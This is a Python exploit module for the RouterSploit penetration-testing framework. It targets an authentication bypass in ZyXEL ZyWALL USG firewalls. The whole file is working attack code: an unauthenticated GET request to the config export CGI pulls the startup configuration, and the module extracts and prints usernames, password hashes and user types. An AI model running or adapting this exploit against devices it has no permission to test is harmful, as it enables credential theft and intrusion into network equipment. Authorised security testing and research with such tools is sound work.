import re
from routersploit import (
    exploits,
    print_error,
    print_status,
    print_table,
    print_success,
    http_request,
    mute,
    validators
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for ZyWall USG 20 Authentication Bypass In Configuration Import/Export.
    If the tharget is vulnerable it allows to download configuration files which contains sensitive data like password hashes, firewall rules and other network related configurations.
    """
    __info__ = {
        'name': 'Zyxel ZyWALL USG Extract Hashes',
        'description': 'Exploit implementation for ZyWall USG 20 Authentication Bypass In Configuration Import/Export.'
                       'If the tharget is vulnerable it allows to download configuration files which contains sensitive data like password hashes, firewall rules and other network related configurations.',
        'authors': [
            'RedTeam Pentesting',  # vulnerability discovery
        ],
        'references': [
            'https://www.exploit-db.com/exploits/17244/',
        ],
        'devices': [
            'ZyXEL ZyWALL USG-20',
            'ZyXEL ZyWALL USG-20W',
            'ZyXEL ZyWALL USG-50',
            'ZyXEL ZyWALL USG-100',
            'ZyXEL ZyWALL USG-200',
            'ZyXEL ZyWALL USG-300',
            'ZyXEL ZyWALL USG-1000',
            'ZyXEL ZyWALL USG-1050'
            'ZyXEL ZyWALL USG-2000'
        ],
    }

    target = exploits.Option('', 'Target address e.g. https://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(443, 'Target port')  # default port
    script_content = None

    def run(self):

        if self.check():
            print_success("Target appears to be vulnerable")

            if self.script_content and len(self.script_content):
                print_status("Parsing the script ...")
                creds = []

                for line in self.script_content.split("\n"):
                    line = line.strip()
                    m_groups = re.match(r'username (.*) password (.*) user-type (.*)', line, re.I | re.M)
                    if m_groups:
                        creds.append((m_groups.group(1), m_groups.group(2), m_groups.group(3)))

                print_table(('Username', 'Hash', 'User type'), *creds)

        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):  # todo: requires improvement
        url = "{}:{}/cgi-bin/export-cgi/images/?category={}&arg0={}".format(self.target, self.port, 'config', 'startup-config.conf')
        response = http_request(method="GET", url=url)

        if response is not None and response.status_code == 200:
            self.script_content = response.text
            return True  # target is vulnerable

        return False  # target is not vulnerable
